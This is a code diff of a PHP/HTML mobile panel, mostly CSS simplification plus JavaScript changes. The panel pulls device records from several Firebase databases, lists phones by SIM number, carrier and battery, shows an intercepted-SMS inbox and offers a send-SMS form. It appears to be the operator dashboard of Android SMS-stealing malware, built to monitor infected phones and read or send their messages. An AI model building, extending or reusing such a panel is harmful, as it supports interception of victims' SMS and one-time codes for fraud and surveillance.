@@ -67,48 +67,29 @@ header('Content-Type: text/html; charset=UTF-8');
   --accent:#ff3c3c;--accent2:#ff9500;--text:#e8e8f0;--muted:#6b6b88;
   --success:#00ff9d;--error:#ff4466;--nav-h:64px;--hdr-h:56px;
   --safe-t:env(safe-area-inset-top,0px);--safe-b:env(safe-area-inset-bottom,0px);
-  --ios-blue:#0a84ff;--ios-purple:#bf5af2;--ios-titanium:#8e8e93;
 }
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;overflow:hidden}
-body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased}
-.app{position:fixed;inset:0;display:flex;flex-direction:column;background:var(--bg)}
-.app-bg{position:absolute;inset:0;overflow:hidden;pointer-events:none;z-index:0}
-.app-orb{position:absolute;border-radius:50%;filter:blur(70px);opacity:.35;animation:orbDrift 14s ease-in-out infinite}
-.app-orb.a{width:280px;height:280px;background:#ff3c3c;top:-8%;left:-12%;animation-delay:0s}
-.app-orb.b{width:240px;height:240px;background:#ff9500;bottom:10%;right:-10%;animation-delay:-5s}
-.app-orb.c{width:200px;height:200px;background:#7b2fff;top:45%;left:40%;opacity:.2;animation-delay:-9s}
-.app>*:not(.app-bg){position:relative;z-index:1}
+body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
+.app{position:fixed;inset:0;display:flex;flex-direction:column;background:
+  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(255,60,60,0.15),transparent),
+  radial-gradient(ellipse 60% 40% at 100% 100%,rgba(255,149,0,0.08),transparent),
+  var(--bg)}
 .hidden{display:none!important}
 .mono{font-family:'Space Mono',monospace}
-@keyframes orbDrift{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(24px,-20px) scale(1.06)}}
-@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:none}}
-@keyframes fadeIn{from{opacity:0}to{opacity:1}}
-@keyframes slideInRight{from{opacity:0;transform:translateX(28px)}to{opacity:1;transform:none}}
-@keyframes slideInLeft{from{opacity:0;transform:translateX(-28px)}to{opacity:1;transform:none}}
-@keyframes popIn{0%{opacity:0;transform:scale(.88)}70%{transform:scale(1.02)}100%{opacity:1;transform:scale(1)}}
-@keyframes floatPhone{0%,100%{transform:translateY(0) rotate(-1deg)}50%{transform:translateY(-6px) rotate(1deg)}}
-@keyframes pulseRing{0%{box-shadow:0 0 0 0 rgba(0,255,157,.45)}70%{box-shadow:0 0 0 10px rgba(0,255,157,0)}100%{box-shadow:0 0 0 0 rgba(0,255,157,0)}}
-@keyframes shimmer{0%{background-position:-200% center}100%{background-position:200% center}}
-@keyframes spin{to{transform:rotate(360deg)}}
-@keyframes iosGlow{0%,100%{opacity:.55}50%{opacity:1}}
-@keyframes bubbleIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:none}}
-@keyframes statPop{0%{transform:scale(1)}50%{transform:scale(1.12)}100%{transform:scale(1)}}
 
 /* LOGIN */
-.login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;padding:24px;padding-top:calc(24px + var(--safe-t));background:
-  radial-gradient(ellipse 80% 50% at 50% -20%,rgba(255,60,60,0.18),transparent),var(--bg)}
-.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.2);box-shadow:0 24px 60px rgba(0,0,0,0.5);animation:popIn .55s cubic-bezier(.34,1.4,.64,1) both}
+.login-screen{position:fixed;inset:0;z-index:100;display:flex;align-items:center;justify-content:center;padding:24px;padding-top:calc(24px + var(--safe-t))}
+.login-card{width:100%;max-width:360px;padding:28px 22px;border-radius:24px;background:linear-gradient(160deg,rgba(20,20,30,0.95),rgba(10,10,16,0.98));border:1px solid rgba(255,60,60,0.2);box-shadow:0 24px 60px rgba(0,0,0,0.5)}
 .login-logo{display:flex;align-items:center;gap:12px;margin-bottom:24px}
-.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(255,60,60,0.12);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px;animation:iosGlow 2.5s ease-in-out infinite}
+.login-logo .mark{width:44px;height:44px;border-radius:14px;background:rgba(255,60,60,0.12);border:1.5px solid var(--accent);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:20px}
 .login-logo h1{font-size:22px;font-weight:800}
 .login-logo em{color:var(--accent);font-style:normal}
 .login-sub{color:var(--muted);font-size:12px;margin:-16px 0 20px}
 .key-input{width:100%;padding:16px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-family:'Space Mono',monospace;font-size:14px;letter-spacing:1px;text-transform:uppercase;outline:none}
 .key-input:focus{border-color:var(--accent)}
 .login-err{color:var(--error);font-size:12px;margin:10px 0;display:none}
-.btn-primary{width:100%;margin-top:16px;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--accent),#cc2020);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:15px;cursor:pointer;transition:transform .15s ease,box-shadow .15s}
-.btn-primary:active{transform:scale(.97)}
+.btn-primary{width:100%;margin-top:16px;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--accent),#cc2020);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:15px;cursor:pointer}
 .btn-primary:disabled{opacity:0.6}
 .remember{display:flex;align-items:center;gap:8px;margin-top:14px;font-size:12px;color:var(--muted)}
 .remember input{width:18px;height:18px;accent-color:var(--accent)}
@@ -120,23 +101,18 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 .hdr-title{font-size:15px;font-weight:800;white-space:nowrap}
 .hdr-sub{font-size:9px;color:var(--muted);font-family:'Space Mono',monospace;letter-spacing:1px}
 .hdr-actions{display:flex;gap:8px;flex-shrink:0}
-.icon-btn{width:38px;height:38px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:transform .2s}
-.icon-btn.spinning span{display:inline-block;animation:spin .7s linear infinite}
-.icon-btn:active{transform:scale(.92)}
+.icon-btn{width:38px;height:38px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
 .fb-chip{max-width:110px;padding:8px 12px;border-radius:100px;border:1px solid rgba(255,149,0,0.3);background:rgba(255,149,0,0.1);color:var(--accent2);font-family:'Space Mono',monospace;font-size:9px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 
 /* SCREENS */
 .screens{flex:1;overflow:hidden;position:relative}
-.screen{position:absolute;inset:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:12px 14px calc(var(--nav-h) + var(--safe-b) + 16px);opacity:0;pointer-events:none;transform:translateX(24px);transition:opacity .32s cubic-bezier(.32,.72,0,1),transform .32s cubic-bezier(.32,.72,0,1)}
+.screen{position:absolute;inset:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:12px 14px calc(var(--nav-h) + var(--safe-b) + 16px);opacity:0;pointer-events:none;transform:translateX(12px);transition:opacity .22s ease,transform .22s ease}
 .screen.active{opacity:1;pointer-events:auto;transform:none}
-.screen.slide-back{transform:translateX(-24px)}
 
 /* STATS */
 .stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
-.stat-card{padding:12px 10px;border-radius:14px;background:var(--card);border:1px solid var(--border);text-align:center;animation:fadeUp .45s ease both}
-.stat-card:nth-child(1){animation-delay:.05s}.stat-card:nth-child(2){animation-delay:.1s}.stat-card:nth-child(3){animation-delay:.15s}
-.stat-val{font-size:20px;font-weight:800;font-family:'Space Mono',monospace;transition:transform .3s}
-.stat-val.bump{animation:statPop .35s ease}
+.stat-card{padding:12px 10px;border-radius:14px;background:var(--card);border:1px solid var(--border);text-align:center}
+.stat-val{font-size:20px;font-weight:800;font-family:'Space Mono',monospace}
 .stat-val.on{color:var(--success)}.stat-val.off{color:var(--error)}
 .stat-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-top:2px}
 
@@ -144,89 +120,40 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 .search{width:100%;padding:12px 14px;border-radius:14px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:14px;outline:none}
 .search:focus{border-color:var(--accent)}
 
-/* iOS DEVICE LIST */
-.dev-list{display:flex;flex-direction:column;gap:14px}
-.ios-row{display:flex;align-items:center;gap:14px;padding:12px 14px 12px 10px;border-radius:20px;background:linear-gradient(135deg,rgba(22,22,32,.95),rgba(12,12,18,.98));border:1px solid var(--border);cursor:pointer;transition:transform .2s cubic-bezier(.34,1.2,.64,1),border-color .2s,box-shadow .2s;animation:fadeUp .5s ease both}
-.ios-row:active{transform:scale(.97)}
-.ios-row.active{border-color:rgba(10,132,255,.55);box-shadow:0 0 28px rgba(10,132,255,.15),inset 0 0 0 1px rgba(10,132,255,.1)}
-.ios-row.online.active{border-color:rgba(0,255,157,.4);box-shadow:0 0 28px rgba(0,255,157,.12)}
-.ios-row.online .iphone-shell{animation:floatPhone 4s ease-in-out infinite}
-.ios-row.online .iphone-shell::after{animation:pulseRing 2.2s ease-out infinite}
-
-/* iPhone frame */
-.iphone-shell{position:relative;width:72px;height:148px;flex-shrink:0;border-radius:18px;padding:3px;background:linear-gradient(145deg,#3a3a3c,#1c1c1e 40%,#2c2c2e);box-shadow:inset 0 0 0 1px rgba(255,255,255,.12),0 8px 24px rgba(0,0,0,.45);transition:transform .25s}
-.iphone-shell::before{content:'';position:absolute;right:-2px;top:36px;width:2px;height:22px;background:#4a4a4c;border-radius:0 2px 2px 0;box-shadow:0 32px 0 #4a4a4c,0 52px 0 #4a4a4c}
-.iphone-shell::after{content:'';position:absolute;inset:-4px;border-radius:22px;pointer-events:none}
-.iphone-shell.c-blue .iphone-screen{background:linear-gradient(180deg,#1a3a5c 0%,#0d1f33 50%,#081018 100%)}
-.iphone-shell.c-purple .iphone-screen{background:linear-gradient(180deg,#2d1b4e 0%,#1a0f30 50%,#0d0818 100%)}
-.iphone-shell.c-titanium .iphone-screen{background:linear-gradient(180deg,#2c2c2e 0%,#1a1a1c 50%,#0f0f10 100%)}
-.iphone-shell.c-gold .iphone-screen{background:linear-gradient(180deg,#3d3020 0%,#221a10 50%,#141008 100%)}
-.iphone-shell.c-red .iphone-screen{background:linear-gradient(180deg,#4a1515 0%,#2a0a0a 50%,#180505 100%)}
-.iphone-screen{position:relative;width:100%;height:100%;border-radius:15px;overflow:hidden;display:flex;flex-direction:column;align-items:center;padding:22px 6px 8px}
-.iphone-island{position:absolute;top:8px;left:50%;transform:translateX(-50%);width:36px;height:11px;background:#000;border-radius:20px;z-index:2;box-shadow:0 0 0 1px rgba(255,255,255,.06)}
-.iphone-island::after{content:'';position:absolute;right:8px;top:50%;transform:translateY(-50%);width:5px;height:5px;border-radius:50%;background:#1a3a1a;box-shadow:0 0 4px rgba(0,255,100,.4)}
-.ios-status-top{width:100%;display:flex;justify-content:space-between;align-items:center;padding:0 4px;font-size:7px;font-weight:700;font-family:-apple-system,sans-serif;color:rgba(255,255,255,.9);margin-bottom:auto}
-.ios-status-top .ios-time{font-size:8px;font-weight:800}
-.ios-status-icons{display:flex;gap:3px;align-items:center}
-.ios-sig{width:12px;height:8px;display:flex;align-items:flex-end;gap:1px}
-.ios-sig i{display:block;width:2px;background:#fff;border-radius:1px}
-.ios-sig i:nth-child(1){height:3px;opacity:.5}.ios-sig i:nth-child(2){height:5px;opacity:.7}.ios-sig i:nth-child(3){height:7px}
-.ios-bat-mini{width:16px;height:8px;border:1px solid rgba(255,255,255,.7);border-radius:2px;position:relative;padding:1px}
-.ios-bat-mini::after{content:'';position:absolute;right:-3px;top:2px;width:2px;height:4px;background:rgba(255,255,255,.7);border-radius:0 1px 1px 0}
-.ios-bat-mini span{display:block;height:100%;border-radius:1px;background:var(--success)}
-.ios-bat-mini.low span{background:var(--error)}
-.ios-lock-icon{font-size:18px;margin:8px 0 4px;opacity:.85}
-.ios-screen-phone{font-size:9px;font-weight:800;text-align:center;color:#fff;letter-spacing:.3px;line-height:1.3;word-break:break-all;padding:0 2px}
-.ios-screen-model{font-size:6px;color:rgba(255,255,255,.45);margin-top:3px;text-align:center;font-family:'Space Mono',monospace}
-.ios-home-bar{width:28px;height:3px;border-radius:3px;background:rgba(255,255,255,.35);margin-top:auto;margin-bottom:2px}
-.ios-online-pip{position:absolute;bottom:6px;right:6px;width:8px;height:8px;border-radius:50%;background:var(--muted);border:2px solid rgba(0,0,0,.5)}
-.ios-row.online .ios-online-pip{background:var(--success);box-shadow:0 0 8px var(--success)}
-
-.ios-info{flex:1;min-width:0}
-.ios-info-phone{font-size:16px;font-weight:800;margin-bottom:3px;letter-spacing:-.3px}
-.ios-info-model{font-size:11px;color:var(--muted);margin-bottom:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.ios-info-model em{color:var(--ios-blue);font-style:normal;font-weight:600}
-.ios-chips{display:flex;flex-wrap:wrap;gap:5px}
-.chip{font-size:8px;padding:4px 9px;border-radius:20px;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace;background:rgba(0,0,0,.2)}
+/* DEVICE CARDS */
+.dev-card{display:flex;gap:12px;padding:14px;margin-bottom:10px;border-radius:16px;background:var(--card);border:1px solid var(--border);cursor:pointer;transition:transform .15s ease,border-color .15s}
+.dev-card:active{transform:scale(0.98)}
+.dev-card.active{border-color:rgba(255,60,60,0.5);box-shadow:0 0 20px rgba(255,60,60,0.12)}
+.dev-bar{width:4px;border-radius:4px;background:var(--muted);flex-shrink:0}
+.dev-card.online .dev-bar{background:var(--success);box-shadow:0 0 8px var(--success)}
+.dev-body{flex:1;min-width:0}
+.dev-phone{font-size:15px;font-weight:800;margin-bottom:2px}
+.dev-meta{font-size:10px;color:var(--muted);font-family:'Space Mono',monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dev-chips{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
+.chip{font-size:8px;padding:3px 8px;border-radius:20px;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace}
 .chip.bat{color:var(--success);border-color:rgba(0,255,157,0.25)}
-.chip.ios{font-size:7px;color:var(--ios-blue);border-color:rgba(10,132,255,.25)}
-.empty-state{text-align:center;padding:48px 20px;color:var(--muted);animation:fadeIn .5s ease}
-.empty-state .ico{font-size:40px;margin-bottom:12px;opacity:0.5;animation:floatPhone 3s ease-in-out infinite}
+.empty-state{text-align:center;padding:48px 20px;color:var(--muted)}
+.empty-state .ico{font-size:40px;margin-bottom:12px;opacity:0.5}
 
-/* DEVICE HERO — large iPhone */
-.hero-wrap{display:flex;flex-direction:column;align-items:center;animation:popIn .5s cubic-bezier(.34,1.2,.64,1) both}
-.hero-iphone{margin:8px 0 20px}
-.hero-iphone .iphone-shell{width:180px;height:370px;border-radius:36px;padding:6px}
-.hero-iphone .iphone-shell.online{animation:floatPhone 5s ease-in-out infinite}
-.hero-iphone .iphone-screen{border-radius:30px;padding:48px 14px 16px}
-.hero-iphone .iphone-island{width:72px;height:22px;top:14px;border-radius:20px}
-.hero-iphone .ios-status-top{font-size:11px;padding:0 8px}
-.hero-iphone .ios-time{font-size:13px}
-.hero-iphone .ios-lock-icon{font-size:36px;margin:24px 0 12px}
-.hero-iphone .ios-screen-phone{font-size:18px;letter-spacing:.5px}
-.hero-iphone .ios-screen-model{font-size:10px;margin-top:8px}
-.hero-iphone .ios-home-bar{width:56px;height:5px}
-.hero-iphone .ios-bat-mini{width:24px;height:11px}
-.hero-iphone .ios-sig i{width:3px}.hero-iphone .ios-sig i:nth-child(1){height:4px}.hero-iphone .ios-sig i:nth-child(2){height:7px}.hero-iphone .ios-sig i:nth-child(3){height:10px}
-.hero-stats{width:100%;display:grid;grid-template-columns:repeat(2,1fr);gap:8px;animation:fadeUp .5s .15s ease both}
-.hero-cell{padding:12px;border-radius:14px;background:var(--card);border:1px solid var(--border)}
-.hero-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-bottom:4px}
-.hero-val{font-size:14px;font-weight:700;font-family:'Space Mono',monospace}
-.hero-badge-wrap{text-align:center;margin-bottom:12px;animation:fadeUp .4s .1s ease both}
-.hero-badge{display:inline-block;padding:6px 14px;border-radius:100px;font-size:10px;font-weight:800;font-family:'Space Mono',monospace}
+/* DEVICE HERO */
+.hero-card{padding:18px;border-radius:20px;background:linear-gradient(145deg,rgba(255,60,60,0.12),rgba(20,20,30,0.95));border:1px solid rgba(255,60,60,0.2);margin-bottom:14px}
+.hero-phone{font-size:22px;font-weight:800;margin-bottom:4px}
+.hero-model{font-size:12px;color:var(--muted);margin-bottom:12px}
+.hero-badge{display:inline-block;padding:5px 12px;border-radius:100px;font-size:10px;font-weight:800;font-family:'Space Mono',monospace;margin-bottom:14px}
 .hero-badge.online{background:rgba(0,255,157,0.15);color:var(--success)}
 .hero-badge.offline{background:rgba(107,107,136,0.15);color:var(--muted)}
-.hero-uid{font-size:8px;color:var(--muted);font-family:'Space Mono',monospace;text-align:center;margin-top:12px;word-break:break-all;animation:fadeIn .5s .2s ease both}
+.hero-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+.hero-cell{padding:10px;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.05)}
+.hero-lbl{font-size:8px;color:var(--muted);letter-spacing:1px;margin-bottom:4px}
+.hero-val{font-size:14px;font-weight:700;font-family:'Space Mono',monospace}
 
-/* SMS CHAT — iMessage style */
-.sms-list{display:flex;flex-direction:column;gap:10px;padding-bottom:8px}
-.sms-bubble{max-width:88%;padding:11px 14px;border-radius:18px;font-size:14px;line-height:1.45;animation:bubbleIn .35s ease both}
-.sms-bubble.in{align-self:flex-start;background:#2c2c2e;border:1px solid rgba(255,255,255,.06);border-bottom-left-radius:4px}
-.sms-bubble.out{align-self:flex-end;background:linear-gradient(135deg,#0a84ff,#0066cc);border:none;color:#fff;border-bottom-right-radius:4px}
-.sms-from{font-size:10px;font-weight:700;margin-bottom:4px;color:var(--accent2)}
-.sms-bubble.out .sms-from{color:rgba(255,255,255,.75)}
+/* SMS CHAT */
+.sms-list{display:flex;flex-direction:column;gap:10px}
+.sms-bubble{max-width:92%;padding:12px 14px;border-radius:16px;font-size:13px;line-height:1.45}
+.sms-bubble.in{align-self:flex-start;background:var(--card);border:1px solid var(--border);border-bottom-left-radius:4px}
+.sms-bubble.out{align-self:flex-end;background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.25);border-bottom-right-radius:4px}
+.sms-from{font-size:10px;font-weight:800;margin-bottom:4px;color:var(--accent2)}
 .sms-time{font-size:9px;color:var(--muted);margin-top:6px;font-family:'Space Mono',monospace}
-.sms-bubble.out .sms-time{color:rgba(255,255,255,.55)}
 .sms-badge{display:inline-block;font-size:7px;padding:2px 6px;border-radius:6px;background:rgba(255,60,60,0.2);color:var(--accent);margin-left:6px}
 
 /* SEND FORM */
@@ -234,8 +161,7 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 .form-label{display:block;font-size:11px;color:var(--muted);margin-bottom:6px;font-weight:600}
 .form-input,.form-textarea{width:100%;padding:14px;border-radius:12px;border:1px solid var(--border);background:var(--surface);color:var(--text);font-size:15px;outline:none;margin-bottom:14px}
 .form-textarea{min-height:120px;resize:none;font-family:inherit}
-.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--ios-blue),#0066cc);color:#fff;font-weight:800;font-size:15px;cursor:pointer;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 20px rgba(10,132,255,.3)}
-.btn-send:active{transform:scale(.97)}
+.btn-send{width:100%;padding:16px;border:none;border-radius:14px;background:linear-gradient(135deg,var(--success),#00cc7a);color:#050508;font-weight:800;font-size:15px;cursor:pointer}
 .send-status{margin-top:10px;font-size:11px;font-family:'Space Mono',monospace;text-align:center}
 
 /* MORE */
@@ -249,13 +175,12 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 .toggle.on::after{transform:translateX(18px)}
 .proto-tag{display:inline-block;padding:4px 10px;border-radius:8px;background:rgba(123,47,255,0.15);color:#b388ff;font-size:9px;font-family:'Space Mono',monospace;margin-bottom:14px}
 
-/* BOTTOM NAV — iOS tab bar */
-.bottom-nav{flex-shrink:0;height:calc(var(--nav-h) + var(--safe-b));padding-bottom:var(--safe-b);display:flex;background:rgba(12,12,18,.92);border-top:1px solid rgba(255,255,255,0.08);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)}
-.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:transparent;color:var(--muted);font-size:9px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 4px;transition:color .2s,transform .2s}
-.nav-item .ico{font-size:22px;line-height:1;transition:transform .25s cubic-bezier(.34,1.4,.64,1)}
-.nav-item.active{color:var(--ios-blue)}
-.nav-item.active .ico{transform:scale(1.15) translateY(-2px);filter:drop-shadow(0 2px 8px rgba(10,132,255,.4))}
-.nav-item:active .ico{transform:scale(.9)}
+/* BOTTOM NAV */
+.bottom-nav{flex-shrink:0;height:calc(var(--nav-h) + var(--safe-b));padding-bottom:var(--safe-b);display:flex;background:rgba(8,8,12,0.95);border-top:1px solid rgba(255,255,255,0.06);backdrop-filter:blur(16px)}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;border:none;background:transparent;color:var(--muted);font-size:9px;font-family:'Space Mono',monospace;cursor:pointer;padding:8px 4px}
+.nav-item .ico{font-size:20px;line-height:1}
+.nav-item.active{color:var(--accent)}
+.nav-item.active .ico{filter:drop-shadow(0 0 6px var(--accent))}
 
 /* SHEET */
 .sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:50;opacity:0;pointer-events:none;transition:opacity .25s}
@@ -271,8 +196,7 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 .toast-wrap{position:fixed;top:calc(12px + var(--safe-t));left:14px;right:14px;z-index:200;pointer-events:none}
 .toast{padding:12px 14px;border-radius:12px;background:var(--card);border:1px solid var(--border);font-size:12px;margin-bottom:8px;animation:toastIn .3s ease}
 .toast.ok{border-color:rgba(0,255,157,0.3)}.toast.err{border-color:rgba(255,68,102,0.3)}
-@keyframes toastIn{from{opacity:0;transform:translateY(-10px) scale(.95)}to{opacity:1;transform:none}}
-@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}}
+@keyframes toastIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
 </style>
 </head>
 <body>
@@ -291,7 +215,6 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
 
 <!-- APP -->
 <div class="app hidden" id="appShell">
-  <div class="app-bg"><div class="app-orb a"></div><div class="app-orb b"></div><div class="app-orb c"></div></div>
   <header class="hdr">
     <div class="hdr-left">
       <div class="hdr-mark">R</div>
@@ -302,7 +225,7 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
     </div>
     <div class="hdr-actions">
       <button class="fb-chip" id="fbChip" onclick="openFbSheet()">Firebase ▾</button>
-      <button class="icon-btn" id="refreshBtn" onclick="refreshData()" title="Refresh"><span>↻</span></button>
+      <button class="icon-btn" onclick="refreshData()" title="Refresh">↻</button>
     </div>
   </header>
 
@@ -314,7 +237,7 @@ body{font-family:'Syne',-apple-system,BlinkMacSystemFont,sans-serif;background:v
         <div class="stat-card"><div class="stat-val off" id="stOffline">0</div><div class="stat-lbl">OFFLINE</div></div>
       </div>
       <div class="search-wrap"><input class="search" id="devSearch" placeholder="Search phone or device..." oninput="renderDevices()"/></div>
-      <div class="dev-list" id="devList"></div>
+      <div id="devList"></div>
     </section>
 
     <section class="screen" id="screen-device">
@@ -374,9 +297,7 @@ var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
 var activeListeners={}, window_sms=[];
-var ACTIVE_FB_KEY='rbl_active_fb';
-var CLIENTS_CACHE_KEY='rbl_clients_cache_v3';
-var CLIENTS_CACHE_TTL=6*60*60*1000;
+var ACTIVE_FB_KEY='rbl_active_fb_m';
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
@@ -419,7 +340,7 @@ function initFirebaseInstance(cfg){
       db=firebase.app(appName).database();
     }catch(e){}
   }
-  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false,connError:'',pollTimer:null};
+  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
   firebaseInstances.push(inst);return inst;
 }
 function initFirebase(){
@@ -446,10 +367,9 @@ function updateFbUi(){
 function switchFirebase(id){
   if(!getFbInstance(id))return;
   activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
-  selDev='';clearListeners();
+  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
   updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
   closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
-  fetchAllData();
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
@@ -460,170 +380,33 @@ function getPhoneFromRecord(s){
   if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
   return String(s.phone_number||s.phone||s.mobile||'').trim();
 }
-function parseBattery(v){
-  if(v==null)return 0;
-  if(typeof v==='number')return v;
-  return parseInt(String(v).replace('%',''),10)||0;
-}
 function resolveOnlineStatus(s,fbId){
   var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
   if(schema==='rabel')return s.status===true||s.online===true;
   if(s.online_status===true)return true;if(s.online_status===false)return false;
   return s.online===true||s.status==='online'||s.status===true;
 }
-function isValidDeviceRecord(raw){
-  if(!raw||typeof raw!=='object'||Array.isArray(raw))return false;
-  if(raw.password||raw.Pass||raw.ExpDate||raw.expiry||raw.userName)return false;
-  if(raw.message&&raw.sender&&raw.dateTime)return false;
-  if(typeof raw.status==='boolean')return true;
-  if(!raw.modelName&&!raw.deviceId&&!raw.device_model&&!raw.device_info&&!raw.live_data&&!raw.name)return false;
-  return true;
-}
 function normalizeClientRecord(raw){
-  if(!isValidDeviceRecord(raw))return null;
-  if(raw.modelName||raw.deviceId||raw.mobNo){
-    var mob=getPhoneFromRecord(raw);
-    return{name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||raw.sdkV||'',
-      online:raw.status===true,status:raw.status,online_status:raw.status===true,
-      battery:parseBattery(raw.battery),network:raw.service_provider||(raw.sims&&raw.sims[0]?raw.sims[0].carrierName:'')||'?',
-      sms_count:raw.sms_count||0,mobNo:mob||raw.mobNo||''};
-  }
-  var r={name:raw.name||raw.device_model||'Unknown',brand:raw.brand||raw.device_brand||'',android:raw.android||raw.android_version||'',
+  if(!raw||typeof raw!=='object')return null;
+  if(raw.password||raw.Pass)return null;
+  if(raw.modelName||raw.deviceId||raw.mobNo)return{
+    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
+    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
+    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
+  };
+  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
     online_status:raw.online_status,online:raw.online,status:raw.status,
-    battery:parseBattery(raw.battery||raw.battery_level),network:raw.network||raw.network_type||'?',
-    sms_count:raw.sms_count||raw.smsCount||raw.total_sms||0,mobNo:getPhoneFromRecord(raw)};
-  r.online=resolveOnlineStatus(Object.assign({},raw,r),raw._fbId||'');
-  return r;
+    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
+    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
 }
 function ingestDeviceData(fbId,node,devId,data){
-  var payload=Object.assign({_fbId:fbId},data);
-  var norm=normalizeClientRecord(payload);if(!norm)return;
+  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
   norm._node=node;norm._fbId=fbId;
   clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
 }
 function mergeSummaryNode(fbId,node,raw){
   if(!raw||typeof raw!=='object')return;
   Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
-}
-function loadAllCaches(){
-  try{
